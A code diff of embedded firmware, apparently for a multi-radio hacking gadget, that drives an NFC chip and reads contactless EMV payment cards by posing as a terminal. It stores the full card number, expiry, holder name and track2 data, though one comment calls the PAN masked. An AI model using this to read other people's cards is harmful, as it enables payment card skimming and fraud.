+}
+
+int nfc_fifo_r(uint8_t* buf, int max_len) {
+    int n = nfc_rr(NFC_FIFO_STA1);
+    if (n <= 0 || n > max_len) n = min(n, max_len);
+    if (n <= 0) return 0;
+    nfc_select();
+    cc_spi->transfer(NFC_OP_FIFO_R);
+    for (int i = 0; i < n; i++) buf[i] = cc_spi->transfer(0x00);
+    nfc_deselect();
+    return n;
+}
+
+void nfc_set_tx_len(int nbytes) {
+    int val = nbytes << 3;
+    nfc_wr(NFC_TX_BYTES1, (val >> 8) & 0xFF);
+    nfc_wr(NFC_TX_BYTES1 + 1, val & 0xFF);
+}
+
+// Raw SPI helpers for atomic transceive (no nfc_select/nfc_deselect per op)
+void nfc_raw_cmd(uint8_t c) { cc_spi->transfer(c); }
+void nfc_raw_wr(uint8_t reg, uint8_t val) { cc_spi->transfer(reg & 0x3F); cc_spi->transfer(val); }
+uint8_t nfc_raw_rr(uint8_t reg) { cc_spi->transfer(NFC_OP_READ | (reg & 0x3F)); return cc_spi->transfer(0x00); }
+void nfc_raw_fifo_w(const uint8_t* data, int len) {
+    cc_spi->transfer(NFC_OP_FIFO_W);
+    for (int i = 0; i < len; i++) cc_spi->transfer(data[i]);
+}
+int nfc_raw_fifo_r(uint8_t* buf, int max_len) {
+    int n = nfc_raw_rr(NFC_FIFO_STA1);
+    if (n <= 0 || n > max_len) n = min(n, max_len);
+    if (n <= 0) return 0;
+    cc_spi->transfer(NFC_OP_FIFO_R);
+    for (int i = 0; i < n; i++) buf[i] = cc_spi->transfer(0x00);
+    return n;
+}
+
+uint8_t* nfc_transceive(const uint8_t* tx, int tx_len, int* rx_len, int timeout_ms) {
+    static uint8_t rx_buf[512];
+    *rx_len = 0;
+
+    // Use helper functions (not raw) — each does its own nfc_select/deselect
+    // This matches how nfc_activate works (which is proven to work for card detection)
+
+    int real_timeout = abs(timeout_ms);
+
+    if (timeout_ms > 0) {
+        // Full mode: prepare + NRT + configure + clear IRQs
+        nfc_cmd(NFC_CMD_STOP_ALL);
+        nfc_cmd(NFC_CMD_RESET_GAIN);
+        uint8_t tmr = nfc_rr(NFC_TIMER_EMV);
+        int step = (tmr & 0x01) ? 4096 : 64;
+        uint32_t nrt = (uint32_t)max(1, real_timeout) * 13560UL / step;
+        if (nrt > 0xFFFF) nrt = 0xFFFF;
+        nfc_wr(NFC_NRT1, (nrt >> 8) & 0xFF);
+        nfc_wr(NFC_NRT1 + 1, nrt & 0xFF);
+        nfc_wr(NFC_ISO14443A, 0x00);
+        uint8_t aux = nfc_rr(NFC_AUX_DEF);
+        nfc_wr(NFC_AUX_DEF, aux & 0x7F);
+        nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+    }
+    if (timeout_ms < 0) {
+        // Ultra-fast: raw SPI without beginTransaction (no mutex overhead)
+        cc_spi->beginTransaction(SPISettings(5000000, MSBFIRST, SPI_MODE1));
+        // CLEAR_FIFO
+        digitalWrite(NFC_CS, LOW); cc_spi->transfer(NFC_CMD_CLEAR_FIFO); digitalWrite(NFC_CS, HIGH);
+        // FIFO write
+        digitalWrite(NFC_CS, LOW); cc_spi->transfer(NFC_OP_FIFO_W);
+        for (int i = 0; i < tx_len; i++) cc_spi->transfer(tx[i]);
+        digitalWrite(NFC_CS, HIGH);
+        // TX bytes
+        int txbits = tx_len << 3;
+        digitalWrite(NFC_CS, LOW); cc_spi->transfer(NFC_TX_BYTES1 & 0x3F); cc_spi->transfer((txbits >> 8) & 0xFF); digitalWrite(NFC_CS, HIGH);
+        digitalWrite(NFC_CS, LOW); cc_spi->transfer((NFC_TX_BYTES1+1) & 0x3F); cc_spi->transfer(txbits & 0xFF); digitalWrite(NFC_CS, HIGH);
+        // TX_CRC
+        digitalWrite(NFC_CS, LOW); cc_spi->transfer(NFC_CMD_TX_CRC); digitalWrite(NFC_CS, HIGH);
+        cc_spi->endTransaction();
+    } else {
+        // Normal: with helper functions
+        nfc_cmd(NFC_CMD_CLEAR_FIFO);
+        nfc_fifo_w(tx, tx_len);
+        int txbits = tx_len << 3;
+        nfc_wr(NFC_TX_BYTES1, (txbits >> 8) & 0xFF);
+        nfc_wr(NFC_TX_BYTES1 + 1, txbits & 0xFF);
+        nfc_cmd(NFC_CMD_TX_CRC);
+    }
+
+    // 6. Poll IRQs
+    unsigned long deadline = millis() + real_timeout + 10;
+    bool got_txe = false, got_rxe = false;
+    uint8_t last_main = 0, last_timer = 0, last_err = 0;
+    while (millis() < deadline) {
+        uint8_t irq_main = nfc_rr(0x1A);
+        uint8_t irq_timer = nfc_rr(0x1B);
+        uint8_t irq_err = nfc_rr(NFC_IRQ_ERR);
+        last_main |= irq_main; last_timer |= irq_timer; last_err |= irq_err;
+
+        if (irq_main & 0x08) got_txe = true;
+        if (irq_main & 0x10) { got_rxe = true; break; }
+        if (irq_main & 0x04) { got_rxe = true; break; }
+        if (irq_timer & 0x40) break;
+        if (irq_err & 0x0F) break;
+        delayMicroseconds(200);
+    }
+
+    if (got_txe && !got_rxe) {
+        unsigned long rx_dl = millis() + timeout_ms;
+        while (millis() < rx_dl) {
+            uint8_t m = nfc_rr(0x1A);
+            uint8_t t = nfc_rr(0x1B);
+            last_main |= m; last_timer |= t;
+            if (m & 0x10) { got_rxe = true; break; }
+            if (m & 0x04) { got_rxe = true; break; }
+            if (t & 0x40) break;
+            delayMicroseconds(200);
+        }
+    }
+
+    Serial.printf("[NFC TX] %d bytes, IRQ: main=%02X timer=%02X err=%02X txe=%d rxe=%d\n",
+                  tx_len, last_main, last_timer, last_err, got_txe, got_rxe);
+
+    int n = nfc_rr(NFC_FIFO_STA1);
+    if (n > 0 && n <= 512) {
+        *rx_len = nfc_fifo_r(rx_buf, min(n, 512));
+        Serial.printf("[NFC RX] %d bytes:", *rx_len);
+        for (int i = 0; i < min(*rx_len, 64); i++) Serial.printf(" %02X", rx_buf[i]);
+        Serial.println();
+        return rx_buf;
+    }
+    Serial.printf("[NFC RX] FIFO empty (n=%d)\n", n);
+    return NULL;
+}
+
+// ISO14443-4 I-block transceive (wraps APDU with PCB byte)
+static uint8_t nfc_i_block_num = 0;
+uint8_t* nfc_transceive_apdu(const uint8_t* apdu, int apdu_len, int* rx_len, int timeout_ms) {
+    static uint8_t tx_buf[270];   // BUG4 fix: was 80
+    static uint8_t result_buf[1024];
+    *rx_len = 0;
+    if (apdu_len + 1 > (int)sizeof(tx_buf)) return NULL;
+
+    int real_to = abs(timeout_ms);
+
+    // Wrap APDU in I-block: PCB + APDU
+    tx_buf[0] = 0x02 | (nfc_i_block_num & 1);
+    memcpy(tx_buf + 1, apdu, apdu_len);
+
+    int resp_len;
+    uint8_t* resp = nfc_transceive(tx_buf, apdu_len + 1, &resp_len, timeout_ms);
+    nfc_i_block_num ^= 1;  // BUG3 fix: toggle immediately after send
+    if (!resp || resp_len < 1) return NULL;
+
+    // Process response: chaining + WTX (matches Raspyjack _iso14443_4.py)
+    int result_len = 0;
+    for (int retries = 0; retries < 20 && resp && resp_len >= 1; retries++) {
+        uint8_t pcb = resp[0];
+
+        // I-block with chaining (M=1): more data coming
+        if ((pcb & 0xE2) == 0x02 && (pcb & 0x10)) {
+            int plen = resp_len - 1;
+            if (result_len + plen <= (int)sizeof(result_buf))
+                memcpy(result_buf + result_len, resp + 1, plen);
+            result_len += plen;
+            uint8_t rack = 0xA2 | (pcb & 0x01);
+            Serial.printf("[ISO] CHAIN +%d (total=%d) R(ACK)=%02X\n", plen, result_len, rack);
+            resp = nfc_transceive(&rack, 1, &resp_len, -real_to);  // BUG1 fix: negative = no STOP_ALL
+            continue;
+        }
+
+        // I-block final (M=0): last or only fragment
+        if ((pcb & 0xE2) == 0x02 && !(pcb & 0x10)) {
+            int plen = resp_len - 1;
+            if (result_len + plen <= (int)sizeof(result_buf))
+                memcpy(result_buf + result_len, resp + 1, plen);
+            result_len += plen;
+            break;
+        }
+
+        // S-WTX: card needs more time
+        if ((pcb & 0xC0) == 0xC0 && (pcb & 0x30) == 0x30) {
+            uint8_t wtxm = (resp_len > 1) ? (resp[1] & 0x3F) : 1;
+            Serial.printf("[ISO] S-WTX (%d)\n", wtxm);
+            uint8_t wtx_resp[2] = {0xF2, wtxm};
+            resp = nfc_transceive(wtx_resp, 2, &resp_len, -2000);  // BUG1 fix: negative
+            continue;
+        }
+
+        Serial.printf("[ISO] PCB:%02X\n", pcb);
+        break;
+    }
+
+    if (result_len == 0) return NULL;
+    *rx_len = result_len;
+    return result_buf;
+}
+
+struct NfcCardInfo {
+    uint8_t uid[10];
+    int uid_len;
+    uint16_t atqa;
+    uint8_t sak;
+    bool valid;
+};
+
+NfcCardInfo nfc_activate() {
+    NfcCardInfo card = {};
+    if (!nfc_opened) return card;
+
+    // WUPA — clear no_tx_par/no_rx_par from any previous auth session
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    nfc_cmd(NFC_CMD_RESET_GAIN);
+    nfc_wr(NFC_ISO14443A, nfc_rr(NFC_ISO14443A) & ~0xC0); // clear no_tx_par + no_rx_par
+    nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    uint8_t a = nfc_rr(NFC_AUX_DEF);
+    nfc_wr(NFC_AUX_DEF, a | 0x80);
+    nfc_set_tx_len(0);
+    nfc_cmd(NFC_CMD_TX_WUPA);
+    delay(10);
+    int fn = nfc_rr(NFC_FIFO_STA1);
+    if (fn < 2) return card;
+    uint8_t atqa_buf[2];
+    nfc_fifo_r(atqa_buf, 2);
+    card.atqa = atqa_buf[0] | (atqa_buf[1] << 8);
+
+    // Anticollision + SELECT for up to 3 cascade levels
+    int uid_pos = 0;
+    for (int level = 1; level <= 3; level++) {
+        uint8_t sel_cmd = 0x93 + (level - 1) * 2;
+
+        nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+        nfc_cmd(NFC_CMD_CLEAR_FIFO);
+        nfc_wr(NFC_ISO14443A, 0x01);
+        uint8_t ax = nfc_rr(NFC_AUX_DEF);
+        nfc_wr(NFC_AUX_DEF, ax & 0x7F);
+        uint8_t antcl[2] = {sel_cmd, 0x20};
+        nfc_fifo_w(antcl, 2);
+        nfc_set_tx_len(2);
+        nfc_cmd(NFC_CMD_TX_NO_CRC);
+        delay(30);
+        fn = nfc_rr(NFC_FIFO_STA1);
+        if (fn < 5) return card;
+        uint8_t resp[5];
+        nfc_fifo_r(resp, 5);
+
+        uint8_t bcc = 0;
+        for (int i = 0; i < 5; i++) bcc ^= resp[i];
+        if (bcc != 0) return card;
+
+        bool cascade = (resp[0] == 0x88);
+
+        nfc_rr(0x1A); nfc_rr(0x1B); nfc_rr(NFC_IRQ_ERR); nfc_rr(NFC_IRQ_TGT);
+        nfc_cmd(NFC_CMD_CLEAR_FIFO);
+        nfc_wr(NFC_ISO14443A, 0x00);
+        uint8_t sel_frame[7] = {sel_cmd, 0x70, resp[0], resp[1], resp[2], resp[3], resp[4]};
+        nfc_fifo_w(sel_frame, 7);
+        int val = 7 << 3;
+        nfc_wr(NFC_TX_BYTES1, (val >> 8) & 0xFF);
+        nfc_wr(NFC_TX_BYTES1 + 1, val & 0xFF);
+        nfc_cmd(NFC_CMD_TX_CRC);
+        delay(20);
+        fn = nfc_rr(NFC_FIFO_STA1);
+        if (fn < 1) return card;
+        uint8_t sak_buf[3];
+        nfc_fifo_r(sak_buf, min(fn, 3));
+        card.sak = sak_buf[0];
+
+        if (cascade) {
+            memcpy(card.uid + uid_pos, resp + 1, 3);
+            uid_pos += 3;
+        } else {
+            memcpy(card.uid + uid_pos, resp, 4);
+            uid_pos += 4;
+        }
+
+        if (!(card.sak & 0x04)) break;
+    }
+
+    card.uid_len = uid_pos;
+    card.valid = true;
+    return card;
+}
+
+bool nfc_open() {
+    if (nfc_opened) return true;
+    // SPI bus shared with CC1101 and SD card (same pins, different CS)
+    pinMode(CC_CS, OUTPUT);
+    digitalWrite(CC_CS, HIGH);
+    pinMode(NFC_CS, OUTPUT);
+    digitalWrite(NFC_CS, HIGH);
+    pinMode(NFC_IRQ, INPUT);
+
+    // Check IC ID (nfc_rr handles SPI mode switch via nfc_select)
+    uint8_t ic = nfc_rr(NFC_IC_ID);
+    if ((ic & 0xF8) != 0x28) {
+        delay(50);
+        ic = nfc_rr(NFC_IC_ID);
+        if ((ic & 0xF8) != 0x28) return false;
+    }
+
+    // Init hardware — aligned with Flipper Zero furi_hal_nfc init
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    nfc_cmd(NFC_CMD_SET_DEFAULT);
+    nfc_wr(NFC_IO_CFG1, 0x07);       // lf_clk_off + out_cl disabled
+    nfc_wr(NFC_IO_CFG2, 0x04);       // io_drv_lvl (Flipper auto-detects, 0x04 is safe default)
+    nfc_wr(NFC_TX_DRIVER, 0xD0);
+    nfc_wr(NFC_PT_MOD, 0x0F);        // Flipper: ptm_res + pt_res only
+    nfc_wr(NFC_ANT_TUNE1, 0x82);
+    nfc_wr(NFC_ANT_TUNE2, 0x82);
+    // RX chain — Flipper settings for better sensitivity
+    nfc_wr(NFC_RX_CONF1, 0x04);      // z600k first-stage filter (Flipper)
+    nfc_wr(0x0C, 0xBD);              // RX_CONF2: AGC enable + sqm_dyn
+    nfc_wr(0x0D, 0x00);              // RX_CONF3
+    nfc_wr(0x0E, 0x00);              // RX_CONF4
+    // Correlator config (Flipper)
+    nfc_wr(0x14, 0x51);              // CORR_CONF1: corr_s0 + corr_s4 + corr_s6
+    nfc_wr(0x15, 0x00);              // CORR_CONF2
+    // EMD suppression — RX start on first 4 bits
+    nfc_wr(0x3E, 0x01);              // EMD_SUP_CONF: rx_start_emv_on
+    // Regulator calibration
+    nfc_cmd(0xC3);                    // ADJUST_REGULATORS
+    delay(6);
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+
+    // Enable oscillator
+    nfc_wr(NFC_OP_CTRL, nfc_rr(NFC_OP_CTRL) | 0x80);
+    delay(10);
+
+    // Configure NFC-A
+    nfc_wr(NFC_MODE_DEF, 0x09);
+    nfc_wr(NFC_BIT_RATE, 0x00);
+    nfc_wr(NFC_ISO14443A, 0x00);     // clear no_tx_par + no_rx_par
+    nfc_cmd(NFC_CMD_RESET_GAIN);
+
+    // Enable field
+    nfc_cmd(NFC_CMD_CLEAR_FIFO);
+    nfc_wr(NFC_OP_CTRL, 0x80 | 0x40 | 0x08);
+    delay(20);
+    nfc_cmd(NFC_CMD_FIELD_ON);
+    delay(100);
+
+    nfc_opened = true;
+    Serial.printf("[NFC] Opened, IC_ID=0x%02X\n", ic);
+    return true;
+}
+
+void nfc_close() {
+    if (!nfc_opened) return;
+    nfc_cmd(NFC_CMD_STOP_ALL);
+    nfc_wr(NFC_OP_CTRL, 0x80);
+    nfc_opened = false;
+}
+
+// ── EMV Reader (simplified) ──
+
+struct EmvCard {
+    char card_type[16];
+    char pan[24];
+    char expiry[10];
+    char effective[10];
+    char holder[27];
+    char app_label[20];
+    char aid_hex[34];
+    uint16_t country_code;
+    uint16_t currency_code;
+    char language[6];
+    char track2[42];
+    char auth_method[48];
+    char usage[48];
+    char service_code[8];
+    uint16_t atc;
+    uint8_t pin_tries;
+    uint8_t pan_seq;
+    bool valid;
+};
+
+const char* emv_country_name(uint16_t c) {
+    switch(c) {
+        case 0x0036: return "Australia"; case 0x0056: return "Belgium";
+        case 0x0076: return "Brazil"; case 0x0124: return "Canada";
+        case 0x0156: return "China"; case 0x0203: return "Czech Rep.";
+        case 0x0208: return "Denmark"; case 0x0246: return "Finland";
+        case 0x0250: return "France"; case 0x0276: return "Germany";
+        case 0x0300: return "Greece"; case 0x0344: return "Hong Kong";
+        case 0x0348: return "Hungary"; case 0x0356: return "India";
+        case 0x0372: return "Ireland"; case 0x0376: return "Israel";
+        case 0x0380: return "Italy"; case 0x0392: return "Japan";
+        case 0x0410: return "S. Korea"; case 0x0442: return "Luxembourg";
+        case 0x0458: return "Malaysia"; case 0x0484: return "Mexico";
+        case 0x0528: return "Netherlands"; case 0x0554: return "New Zealand";
+        case 0x0578: return "Norway"; case 0x0616: return "Poland";
+        case 0x0620: return "Portugal"; case 0x0642: return "Romania";
+        case 0x0643: return "Russia"; case 0x0702: return "Singapore";
+        case 0x0710: return "S. Africa"; case 0x0724: return "Spain";
+        case 0x0752: return "Sweden"; case 0x0756: return "Switzerland";
+        case 0x0764: return "Thailand"; case 0x0792: return "Turkey";
+        case 0x0804: return "Ukraine"; case 0x0826: return "UK";
+        case 0x0840: return "USA"; case 0x0978: return "EU";
+        default: { static char b[6]; snprintf(b,6,"%04X",c); return b; }
+    }
+}
+
+const char* emv_currency_name(uint16_t c) {
+    switch(c) {
+        case 0x0036: return "AUD"; case 0x0124: return "CAD";
+        case 0x0156: return "CNY"; case 0x0203: return "CZK";
+        case 0x0208: return "DKK"; case 0x0348: return "HUF";
+        case 0x0356: return "INR"; case 0x0376: return "ILS";
+        case 0x0392: return "JPY"; case 0x0410: return "KRW";
+        case 0x0458: return "MYR"; case 0x0484: return "MXN";
+        case 0x0554: return "NZD"; case 0x0578: return "NOK";
+        case 0x0616: return "PLN"; case 0x0643: return "RUB";
+        case 0x0702: return "SGD"; case 0x0710: return "ZAR";
+        case 0x0752: return "SEK"; case 0x0756: return "CHF";
+        case 0x0764: return "THB"; case 0x0792: return "TRY";
+        case 0x0826: return "GBP"; case 0x0840: return "USD";
+        case 0x0978: return "EUR"; case 0x0986: return "BRL";
+        default: { static char b[6]; snprintf(b,6,"%04X",c); return b; }
+    }
+}
+
+// Helper: scan response for a 1-byte TLV tag, return pointer to value and set *out_len
+uint8_t* emv_find_tag1(uint8_t* buf, int buf_len, uint8_t tag, int* out_len) {
+    for (int i = 0; i < buf_len - 2; i++) {
+        if (buf[i] == tag) {
+            int tl = buf[i+1];
+            if (tl > 0 && i+2+tl <= buf_len) { *out_len = tl; return buf+i+2; }
+        }
+    }
+    *out_len = 0; return nullptr;
+}
+// Helper: scan for 2-byte TLV tag (e.g. 5F24, 9F12)
+uint8_t* emv_find_tag2(uint8_t* buf, int buf_len, uint8_t t1, uint8_t t2, int* out_len) {
+    for (int i = 0; i < buf_len - 3; i++) {
+        if (buf[i] == t1 && buf[i+1] == t2) {
+            int tl = buf[i+2];
+            if (tl > 0 && i+3+tl <= buf_len) { *out_len = tl; return buf+i+3; }
+        }
+    }
+    *out_len = 0; return nullptr;
+}
+
+// Extract masked PAN from BCD bytes (tag 5A or Track2 before 'D')
+void emv_extract_pan(EmvCard& emv, uint8_t* bcd, int bcd_len, bool is_track2) {
+    if (emv.pan[0] != 0) return;
+    char full[24] = {};
+    for (int j = 0; j < bcd_len && j < 11; j++)
+        snprintf(full + j*2, 3, "%02X", bcd[j]);
+    if (is_track2) {
+        char* sep = strchr(full, 'D');
+        if (sep) *sep = 0;
+    }
+    int pl = strlen(full);
+    while (pl > 0 && (full[pl-1] == 'F' || full[pl-1] == 'f')) full[--pl] = 0;
+    if (pl >= 8) {
+        // PAN en clair complet (avec espaces tous les 4 chiffres)
+        char tmp[24] = {};
+        int t = 0;
+        for (int i = 0; i < pl && t < 22; i++) {
+            if (i > 0 && i % 4 == 0) tmp[t++] = ' ';
+            tmp[t++] = full[i];
+        }
+        strncpy(emv.pan, tmp, sizeof(emv.pan) - 1);
+    }
+}
+
+EmvCard nfc_read_emv() {
+    EmvCard emv = {};
+    nfc_i_block_num = 0;
+
+    // Step 1: SELECT PPSE
+    uint8_t ppse[] = {0x00, 0xA4, 0x04, 0x00, 0x0E,
+        0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53, 0x2E,
+        0x44, 0x44, 0x46, 0x30, 0x31, 0x00};
+    int rx_len;
+    uint8_t* resp = nfc_transceive_apdu(ppse, sizeof(ppse), &rx_len, 500);
+    Serial.printf("[EMV] PPSE resp: %d bytes\n", rx_len);
+    int aid_len = 0;
+    uint8_t aid[16];
+
+    // Collect ALL AIDs from PPSE (multi-AID scan like Raspyjack)
+    uint8_t all_aids[8][16];
+    int all_aid_lens[8];
+    int num_aids = 0;
+    if (resp && rx_len >= 4) {
+        Serial.printf("[EMV] PPSE OK: %d bytes\n", rx_len);
+        // Scan for all 0x4F tags
+        for (int pos = 0; pos < rx_len - 2 && num_aids < 8; pos++) {
+            if (resp[pos] == 0x4F && pos+1 < rx_len) {
+                int al = resp[pos+1];
+                if (al > 0 && al <= 16 && pos+2+al <= rx_len) {
+                    memcpy(all_aids[num_aids], resp+pos+2, al);
+                    all_aid_lens[num_aids] = al;
+                    num_aids++;
+                    pos += 1 + al;
+                }
+            }
+        }
+        Serial.printf("[EMV] Found %d AIDs in PPSE\n", num_aids);
+        if (num_aids > 0) { aid_len = all_aid_lens[0]; memcpy(aid, all_aids[0], aid_len); }
+    }
+
+    // If PPSE failed (6A83 = file not found), try known AIDs directly
+    if (aid_len == 0) {
+        Serial.println("[EMV] PPSE failed, trying known AIDs...");
+        // Fallback AIDs from Raspyjack _FALLBACK_AIDS
+        static const uint8_t KNOWN_AIDS[][7] = {
+            {0xA0,0x00,0x00,0x00,0x03,0x10,0x10}, // Visa
+            {0xA0,0x00,0x00,0x00,0x04,0x10,0x10}, // Mastercard
+            {0xA0,0x00,0x00,0x00,0x42,0x10,0x10}, // CB
+            {0xA0,0x00,0x00,0x00,0x42,0x20,0x10}, // CB Debit
+            {0xA0,0x00,0x00,0x00,0x42,0x30,0x10}, // CB3
+            {0xA0,0x00,0x00,0x00,0x42,0x40,0x10}, // CB4
+            {0xA0,0x00,0x00,0x00,0x03,0x20,0x10}, // Visa Electron
+            {0xA0,0x00,0x00,0x00,0x04,0x20,0x10}, // MC Debit
+            {0xA0,0x00,0x00,0x00,0x04,0x30,0x60}, // Maestro
+        };
+        static const int NUM_AIDS = sizeof(KNOWN_AIDS)/sizeof(KNOWN_AIDS[0]);
+        for (int a = 0; a < NUM_AIDS && aid_len == 0; a++) {
+            uint8_t sel[14] = {0x00, 0xA4, 0x04, 0x00, 0x07};
+            memcpy(sel + 5, KNOWN_AIDS[a], 7);
+            sel[12] = 0x00;
+            resp = nfc_transceive_apdu(sel, 13, &rx_len, 500);
+            if (resp && rx_len >= 4 && resp[rx_len-2] == 0x90 && resp[rx_len-1] == 0x00) {
+                aid_len = 7;
+                memcpy(aid, KNOWN_AIDS[a], 7);
+                Serial.printf("[EMV] Direct AID: ");
+                for (int i = 0; i < 7; i++) Serial.printf("%02X", aid[i]);
+                Serial.println();
+            }
+        }
+    }
+
+    // Build final AID list: PPSE AIDs + fallback
+    if (aid_len == 0 && num_aids == 0) { Serial.println("[EMV] No AID found"); return emv; }
+    // If we only have 1 AID (from fallback or single PPSE), try it
+    // If multi PPSE, loop below tries each
+    if (num_aids == 0 && aid_len > 0) { num_aids = 1; memcpy(all_aids[0], aid, aid_len); all_aid_lens[0] = aid_len; }
+
+    // Try each AID until one produces PAN
+    for (int aid_idx = 0; aid_idx < num_aids; aid_idx++) {
+    aid_len = all_aid_lens[aid_idx];
+    memcpy(aid, all_aids[aid_idx], aid_len);
+    emv = {}; // reset for each attempt
+
+    // Store AID hex
+    for (int i = 0; i < aid_len && i < 16; i++)
+        snprintf(emv.aid_hex + i*2, 3, "%02X", aid[i]);
+    Serial.printf("[EMV] Trying AID #%d: %s\n", aid_idx, emv.aid_hex);
+
+    // Step 2: SELECT AID
+    uint8_t sel_aid[22] = {0x00, 0xA4, 0x04, 0x00, (uint8_t)aid_len};
+    memcpy(sel_aid + 5, aid, aid_len);
+    sel_aid[5 + aid_len] = 0x00;
+    resp = nfc_transceive_apdu(sel_aid, 6 + aid_len, &rx_len, 500);
+    Serial.printf("[EMV] SELECT AID resp: %d bytes\n", rx_len);
+    if (!resp || rx_len < 4) { Serial.println("[EMV] SELECT AID failed"); return emv; }
+
+    // Card type from AID
+    if (aid_len >= 5 && aid[0]==0xA0 && aid[1]==0x00 && aid[2]==0x00 && aid[3]==0x00) {
+        if (aid[4]==0x04) strcpy(emv.card_type, "Mastercard");
+        else if (aid[4]==0x03) strcpy(emv.card_type, "Visa");
+        else if (aid[4]==0x42) strcpy(emv.card_type, "CB");
+        else if (aid[4]==0x25) strcpy(emv.card_type, "Amex");
+        else if (aid[4]==0x65) strcpy(emv.card_type, "JCB");
+        else strcpy(emv.card_type, "Unknown");
+    } else strcpy(emv.card_type, "Unknown");
+
+    // Extract app label (tag 50) from SELECT AID response
+    int tl = 0;
+    uint8_t* tv = emv_find_tag1(resp, rx_len, 0x50, &tl);
+    if (tv && tl > 0 && tl < 20) { memcpy(emv.app_label, tv, tl); emv.app_label[tl] = 0; }
+    // Fallback: Application Preferred Name (tag 9F12)
+    if (emv.app_label[0] == 0) {
+        tv = emv_find_tag2(resp, rx_len, 0x9F, 0x12, &tl);
+        if (tv && tl > 0 && tl < 20) { memcpy(emv.app_label, tv, tl); emv.app_label[tl] = 0; }
+    }
+    // Language (tag 5F2D) from SELECT AID
+    tv = emv_find_tag2(resp, rx_len, 0x5F, 0x2D, &tl);
+    if (tv && tl >= 2) { emv.language[0]=tv[0]; emv.language[1]=tv[1]; emv.language[2]=0; }
+
+    // Step 3: GPO with dynamic PDOL (from Raspyjack _emv_reader.py)
+    // Find PDOL (tag 9F38) in SELECT AID response
+    int pdol_len = 0;
+    uint8_t* pdol_raw = emv_find_tag2(resp, rx_len, 0x9F, 0x38, &pdol_len);
+
+    // Build PDOL data from card's requested tags
+    uint8_t pdol_data[64];
+    int pdol_data_len = 0;
+    if (pdol_raw && pdol_len > 0) {
+        int pi = 0;
+        while (pi < pdol_len && pdol_data_len < 60) {
+            uint16_t ptag = pdol_raw[pi++];
+            if ((ptag & 0x1F) == 0x1F && pi < pdol_len)
+                ptag = (ptag << 8) | pdol_raw[pi++];
+            if (pi >= pdol_len) break;
+            uint8_t plen = pdol_raw[pi++];
+            // Provide known terminal values (matching Raspyjack PDOL_VALUES)
+            const uint8_t* val = nullptr; int vlen = 0;
+            // PDOL terminal values — matched to Raspyjack PDOL_VALUES
+            static const uint8_t V_TTQ[]  = {0xA6, 0x00, 0x00, 0x00}; // contactless MSD+qVSDC
+            static const uint8_t V_TC[]   = {0xF0, 0x00, 0xF0, 0xA0, 0x01}; // terminal cap (9F40)
+            static const uint8_t V_AMT[]  = {0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
+            static const uint8_t V_AMTO[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+            static const uint8_t V_CTRY[] = {0x02, 0x50}; // France
+            static const uint8_t V_CURR[] = {0x09, 0x78}; // EUR
+            static const uint8_t V_DATE[] = {0x26, 0x08, 0x31};
+            static const uint8_t V_TYPE[] = {0x00};
+            static const uint8_t V_UNPR[] = {0x82, 0x3D, 0xDE, 0x7A};
+            static const uint8_t V_TVR[]  = {0x00, 0x00, 0x00, 0x00, 0x00};
+            static const uint8_t V_59[]   = {0xC8, 0x80, 0x00};
+            static const uint8_t V_5A[]   = {0x00};
+            static const uint8_t V_58[]   = {0x01};
+            static const uint8_t V_6C[]   = {0x00, 0x01}; // mag stripe app ver
+            static const uint8_t V_33[]   = {0xE0, 0xF0, 0xC8}; // terminal capabilities
+            static const uint8_t V_35[]   = {0x22}; // terminal type (contactless)
+            static const uint8_t V_34[]   = {0x00, 0x00, 0x00}; // CVM results
+            static const uint8_t V_09[]   = {0x00, 0x02}; // app version
+            static const uint8_t V_41[]   = {0x00, 0x00, 0x00, 0x01}; // tx seq counter
+            switch (ptag) {
+                case 0x9F66: val = V_TTQ;  vlen = 4; break;
+                case 0x9F40: val = V_TC;   vlen = 5; break;
+                case 0x9F02: val = V_AMT;  vlen = 6; break;
+                case 0x9F03: val = V_AMTO; vlen = 6; break;
+                case 0x9F1A: val = V_CTRY; vlen = 2; break;
+                case 0x5F2A: val = V_CURR; vlen = 2; break;
+                case 0x9A:   val = V_DATE; vlen = 3; break;
+                case 0x9C:   val = V_TYPE; vlen = 1; break;
+                case 0x9F37: val = V_UNPR; vlen = 4; break;
+                case 0x95:   val = V_TVR;  vlen = 5; break;
+                case 0x9F59: val = V_59;   vlen = 3; break;
+                case 0x9F5A: val = V_5A;   vlen = 1; break;
+                case 0x9F58: val = V_58;   vlen = 1; break;
+                case 0x9F6C: val = V_6C;   vlen = 2; break;
+                case 0x9F33: val = V_33;   vlen = 3; break;
+                case 0x9F35: val = V_35;   vlen = 1; break;
+                case 0x9F34: val = V_34;   vlen = 3; break;
+                case 0x9F09: val = V_09;   vlen = 2; break;
+                case 0x9F41: val = V_41;   vlen = 4; break;
+                default:     val = nullptr; vlen = 0; break;
+            }
+            for (int k = 0; k < plen && pdol_data_len < 60; k++) {
+                pdol_data[pdol_data_len++] = (val && k < vlen) ? val[k] : 0x00;
+            }
+        }
+        Serial.printf("[EMV] PDOL: %d tags → %d bytes data\n", pdol_len, pdol_data_len);
+    }
+
+    // Build GPO APDU: 80 A8 00 00 [Lc] 83 [pdol_data_len] [pdol_data] 00
+    uint8_t gpo[72] = {0x80, 0xA8, 0x00, 0x00};
+    int gpo_len;
+    if (pdol_data_len > 0) {
+        gpo[4] = (uint8_t)(pdol_data_len + 2);
+        gpo[5] = 0x83;
+        gpo[6] = (uint8_t)pdol_data_len;
+        memcpy(gpo + 7, pdol_data, pdol_data_len);
+        gpo[7 + pdol_data_len] = 0x00;
+        gpo_len = 8 + pdol_data_len;
+    } else {
+        gpo[4] = 0x02; gpo[5] = 0x83; gpo[6] = 0x00; gpo[7] = 0x00;
+        gpo_len = 8;
+    }
+    resp = nfc_transceive_apdu(gpo, gpo_len, &rx_len, 1000);
